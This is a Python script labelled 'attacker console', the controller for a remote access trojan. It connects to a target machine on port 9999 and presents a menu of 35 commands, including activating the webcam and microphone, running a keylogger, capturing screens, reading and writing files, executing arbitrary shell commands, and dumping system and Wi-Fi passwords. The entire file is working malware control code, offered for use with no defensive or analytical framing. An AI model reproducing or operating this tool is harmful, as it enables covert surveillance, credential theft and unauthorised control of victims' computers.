# controller_full.py → YOUR ATTACKER CONSOLE
import socket, time

def run(cmd, data=""):
    with socket.socket() as s:
        s.connect((target, 9999))
        s.recv(1024)
        s.sendall(f"{cmd} {data}".encode())
        if data and cmd not in ["11"]: time.sleep(0.3); s.sendall(data.encode())
        result = ""
        while True:
            chunk = s.recv(4096).decode(errors='ignore')
            result += chunk
            if "\nEND" in chunk: break
        print(result.replace("\nEND",""))

menu = """
(1) Turn on camera           (18) Get active connections
(2) Turn off camera          (19) Get route table
(3) Turn on mic              (20) Get DNS cache
(4) Turn off mic             (21) Fetch computer passwords
(5) Start keylogger          (22) Reboot computer
(6) Stop keylogger           (23) Freeze screen
(7) Show keylogger results   (24) Rick Roll
(8) Capture screen           (25) Record audio
(9) List files in directory  (26) Move mouse
(10) Read file               (27) Click mouse
(11) Write to file           (28) Get Wi-Fi passwords
(12) List processes          (29) Get installed software
(13) Kill process by PID     (30) Get recent files
(14) Scan network            (31) Get startup items
(15) Execute command         (32) Get scheduled tasks
(16) Get system information  (33) Get user accounts
(17) Get network interfaces  (34) Get system events
                                 (35) Fetch content from URL
"""

target = input("Target IP: ")
while True:
    print(menu)
    c = input("Enter your choice (1-35): ").strip()
    if c in ["1","2","4","5","6","7","8","22","23","24","27"]: run(c)
    elif c == "15": run(c, input("Shell command: "))
    elif c in ["9","10","13","26","35"]: run(c, input("Input: "))
    elif c == "11":
        path = input("File path: ")
        content = input("Content (Ctrl+D to end):\n")
        run(c, f"{path}\n{content}")
    elif c in ["3","25"]: run("3")
    else: print("Valid 1–35 only")
